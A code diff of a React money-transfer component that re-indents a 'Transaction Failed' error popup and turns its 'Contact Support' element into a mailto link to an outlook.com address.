@@ -168,32 +168,33 @@ const SendMoney = () => {
 
      {/* Error Popup */}
 {error && (
-  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
-    <div className="bg-white p-6 rounded-lg text-center max-w-sm">
-      <h2 className="text-red-600 font-semibold">
-        Transaction Failed
-      </h2>
-      <p className="text-sm mt-2">
-        This transaction requires manual verification.
-        Please contact customer support to proceed.
-      </p>
+<div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
+  <div className="bg-white p-6 rounded-lg text-center max-w-sm">
+    <h2 className="text-red-600 font-semibold">
+      Transaction Failed
+    </h2>
+    <p className="text-sm mt-2">
+      This transaction requires manual verification.
+      Please contact customer support to proceed.
+    </p>
 
-      {/* Contact Support Button */}
-      <p
-        
-        className="mt-4 inline-block w-full bg-red-600 text-white py-2 rounded hover:bg-red-700 transition"
-      >
-        Contact Support
-      </p>
+    {/* Contact Support Button */}
+    <a
+      href="mailto:Ascendonline1@outlook.com?subject=Transaction%20Verification%20Required"
+      className="mt-4 inline-block w-full bg-red-600 text-white py-2 rounded hover:bg-red-700 transition"
+    >
+      Contact Support
+    </a>
 
-      <button
-        onClick={() => setError(false)}
-        className="mt-4 w-full bg-gray-300 text-gray-800 py-2 rounded hover:bg-gray-400 transition"
-      >
-        Close
-      </button>
-    </div>
+    <button
+      onClick={() => setError(false)}
+      className="mt-4 w-full bg-gray-300 text-gray-800 py-2 rounded hover:bg-gray-400 transition"
+    >
+      Close
+    </button>
   </div>
+</div>
+
 )}
 
 
